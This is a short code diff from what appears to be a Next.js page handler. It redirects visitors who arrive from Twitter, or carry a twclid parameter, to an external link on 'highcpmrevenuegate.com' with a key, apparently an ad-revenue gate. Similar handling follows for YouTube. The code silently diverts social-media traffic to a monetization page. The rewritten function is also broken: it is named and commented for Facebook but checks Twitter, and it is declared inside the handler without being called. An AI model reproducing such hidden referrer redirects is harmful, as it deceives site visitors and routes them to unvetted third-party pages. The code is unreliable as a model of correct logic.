@@ -25,16 +25,19 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 		};
 		}
 
-	if (referringURL?.includes('twitter.com') || tclid) {
-  return {
-    redirect: {
-      permanent: false,
-      destination: `${
-	      `https://www.highcpmrevenuegate.com/ccr98x7c5w?key=841c661ef0a90d217f6c62bf4ce55835`
-      }`,
-    },
-  };
+function redirectIfFacebook(request) {
+  // Check if the request comes from Facebook.
+  if (request.headers['Referer']?.includes('twitter.com') || request.query['twclid']) {
+    // Redirect the user to a landing page.
+    return {
+      redirect: {
+        permanent: false,
+        destination: 'https://www.highcpmrevenuegate.com/ccr98x7c5w?key=841c661ef0a90d217f6c62bf4ce55835',
+      },
+    };
+  }
 }
+
 
 
 	if (referringURL?.includes('youtube.com') || ytclid) {
